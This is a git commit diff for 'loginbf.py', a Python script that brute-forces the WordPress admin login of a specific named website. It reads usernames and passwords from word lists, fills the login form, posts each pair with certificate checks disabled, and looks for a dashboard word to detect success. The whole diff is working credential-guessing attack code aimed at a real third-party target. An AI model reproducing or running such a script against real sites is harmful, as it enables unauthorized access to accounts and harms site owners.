d589b08e1145e844b22689d3cbcbe82ddb0b9146
marzique <marzique@gmail.com>
2019-04-17 15:42:08 +0300

    we can login via POST request NOWgit add .! to wordpress

--- loginbf.py
+++ loginbf.py
@@ -6,19 +6,10 @@ from loginform import fill_login_form
 # url = input("\nEnter URL:")
 url = "http://leafus.com.ua/wp-admin"
 
-# The userfield in the form of the login
-# userField = input("\nEnter the User Field:")
-userField = "log"
-
-# The passwordfield in the form
-# passwordField = input("\nEnter the Password field:")
-passwordField = "pwd"
-
 # Getting list of potentials password
 passwords = open('passwords.txt').readlines()
 # Getting list of user to test with
 users = open('users.txt').readlines()
-
 
 print(f"Connecting to: {url}......\n")
 # Put the target email you want to hack
@@ -26,51 +17,22 @@ print(f"Connecting to: {url}......\n")
 failed_aftertry = 0
 for user in users:
     for password in passwords:
-        dados = {userField: user.replace('\n', ''),
-                 passwordField: password.replace('\n', '')}
-        print(dados)
 
+        # get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
         r = requests.get(url)
-        payload = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
-        # data = dict(payload)
-        print(payload)
-        # print(data)
-        # headers = {'User-Agent': 'Mozilla/5.0'}
+        fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
 
-        # session = requests.Session()
-        # resp = session.post(url, headers=headers, data=payload)
-        # print(resp.content)
-
-
-
-
-
-
-
-        
-        # the session instance holds the cookie. So use it to get/post later.
-        # e.g. session.get('https://example.com/profile')
-
-        # #print data.text
-        # if "404" in data.text:
-        #     if failed_aftertry > 5:
-        #         print("Connexion failed : Trying again ....")
-        #         break
-        #     else:
-        #         failed_aftertry = failed_aftertry+1
-        #         print("Connexion failed : 404 Not Found (Verify your link)")
-        # else:
-        #     # if you want to see the text result decomment this
-        #     print(data.text)
-        #     if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
-        #         print(f"Failed to connect with:\n user: {user} and password: {password}")
-        #     else:
-        #         if successMessage[0] in data.text or successMessage[1] in data.text:
-        #             print("\n#######################################")
-        #             print(f"\nYOUPIII!! \nTheese Credentials succeed:\n> user: {user} and password: {password}")
-        #             print("#######################################")
-        #             break
-        #         else:
-        #             print(f"Trying theese parameters: user: {user} and password: {password}")
+        # POST URL
+        post_url = fillings[-2:-1][0]
+        print(f"{user}: {password}")
+        payload = dict(fillings[:-2][0])
+        with requests.Session() as s:
+            res = requests.get(url)
+            cookies = dict(res.cookies)
+            p = s.post(post_url, data=payload, verify=False, cookies=cookies)
+            if 'Майстерня' in p.text:
+                print('logged in!!')
+            else:
+                print('wrong password')
 
 Just_to_pause_the_script = input("\n.")
